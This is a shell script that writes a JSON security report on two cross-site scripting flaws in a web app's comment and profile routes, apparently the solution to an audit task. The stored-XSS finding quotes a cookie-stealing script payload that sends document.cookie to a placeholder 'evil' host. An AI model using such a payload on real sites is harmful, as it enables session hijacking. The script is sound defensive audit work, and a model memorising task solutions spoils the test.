#!/usr/bin/env bash
set -euo pipefail
export APP_DIR="${APP_DIR:-/app}"
python3 - <<'PYEOF'
import json, os, pathlib

app = pathlib.Path(os.environ.get("APP_DIR", "/app"))
report = {
  "findings": [
    {
      "title": "Stored XSS in comment wall (CWE-79)",
      "severity": "high",
      "category": "Cross-Site Scripting (XSS)",
      "location": "app/routers/comments.py: list_comments, GET /comments",
      "evidence": "Comment author and body are interpolated into HTML with an f-string and returned via HTMLResponse without escaping: f\"<li><b>{c['author']}</b>: {c['body']}</li>\". A POST /comments with body=<script>document.location='https://evil/?c='+document.cookie</script> is stored in memory and executed for every visitor of GET /comments.",
      "impact": "Stored XSS: session hijacking and credential theft for every user viewing the comment wall; persists for the lifetime of the service.",
      "recommendation": "Escape with html.escape() or render via Jinja2 with autoescape enabled; add Content-Security-Policy; sanitize input on ingestion."
    },
    {
      "title": "Reflected XSS in /profile/{username}",
      "severity": "medium",
      "category": "Cross-Site Scripting (XSS)",
      "location": "app/routers/profile.py: get_profile",
      "evidence": "Path parameter username is interpolated unescaped into an HTMLResponse.",
      "impact": "Attacker-crafted links execute script in the victim's browser context.",
      "recommendation": "Escape the value or return JSON; validate username format."
    }
  ]
}

(app / "security_report.json").write_text(json.dumps(report, indent=2) + "\n")
print(f"wrote {app / 'security_report.json'}")
PYEOF
python3 -c "import json,os; json.load(open(os.path.join(os.environ.get('APP_DIR','/app'),'security_report.json'))); print('report OK')"
